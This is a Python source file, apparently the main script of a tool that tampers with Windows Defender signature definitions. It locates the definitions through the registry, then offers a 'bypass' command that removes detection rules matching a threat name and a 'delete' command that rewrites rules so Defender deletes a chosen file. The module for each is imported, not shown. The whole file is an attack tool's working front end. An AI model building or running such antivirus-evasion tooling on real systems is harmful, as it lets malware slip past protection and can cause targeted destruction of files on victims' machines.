import os
import base64
import winreg
import logging
import argparse

from core.utils import version_banner
from core.utils.logger import init_logger
from core.definitions import Definitions

from core.features.delete import DeletePEMockFile
from core.features.bypass import BypassEDRRule

def get_defualt_definition_update_path() -> str:
    logging.info("Getting Signatures Location ...")
    location = winreg.HKEY_LOCAL_MACHINE
    defender_key = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows Defender\Signature Updates")
    signature_location = winreg.QueryValueEx(defender_key, "SignatureLocation")
    
    return signature_location[0]

def router(args, definitions: Definitions):
    if args.command == 'bypass':
        logging.info("Enumerating Anti-Virus Definitions")
        BypassEDRRule(definitions.get_anti_virus_definitions(), args.threat_name).run()

        logging.info("Enumerating Anti-Spyware Definitions")
        BypassEDRRule(definitions.get_anti_spayware_definitions(), args.threat_name).run()
    elif args.command == 'delete':
        string = base64.b64decode(args.string)
        hstrs = [string]

        DeletePEMockFile(definitions.get_anti_spayware_definitions(), hstrs).run()    
    else:
        logging.error(f"Unrecognized command: {args.command}")
        exit(1)

    definitions.export(args.o)

def argument_parser():
    options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
    options.add_argument('-o', metavar='OUTPUT', default='.', help='output folder for the exported vdm files')
    options.add_argument('-d', metavar='DEFINITIONS_PATH', default=get_defualt_definition_update_path(), help='set explicit definitions path')
    subparsers = options.add_subparsers(dest='command', required=True)

    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender rules by threat name')
    bypass_subparser.add_argument('threat_name', type=str, help="delete all threats matching <threat_name>")
    
    delete_parser = subparsers.add_parser('delete', help='delete file by modifying rules')
    delete_parser.add_argument('string', type=str, help='indication strings within the pefile (base64)')
    
    return options.parse_args()

def main():
    init_logger()
    print(version_banner())

    args = argument_parser()

    logging.info(f'Definitions Path: {args.d}')
    definations_path = args.d
    
    if not os.path.exists(args.o):
        raise FileNotFoundError(f'Directory "{args.o}" was not found')

    definitions = Definitions(definations_path)

    router(args, definitions)
    logging.info('Done!')

if __name__ == "__main__":
    main()